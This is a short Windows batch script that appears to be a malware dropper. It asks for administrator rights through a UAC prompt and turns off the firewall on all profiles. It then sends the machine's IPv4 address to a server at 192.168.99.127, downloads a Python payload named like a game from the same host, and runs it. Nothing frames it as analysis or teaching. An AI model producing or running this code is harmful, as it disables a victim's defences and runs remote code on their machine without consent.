@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
powershell -Command "Start-Process cmd -ArgumentList '/c \"%~fnx0\"' -Verb RunAs"
exit /b
)
NetSh Advfirewall set allprofiles state off
(for /F "tokens=16" %%i in ('"ipconfig | findstr IPv4"') do (curl -d %%i http://192.168.99.127:8888/))
curl http://192.168.99.127:8000/payload/jeu.pyw -o C:\Users\Public\Documents\jeu.py
python C:\Users\Public\Documents\jeu.py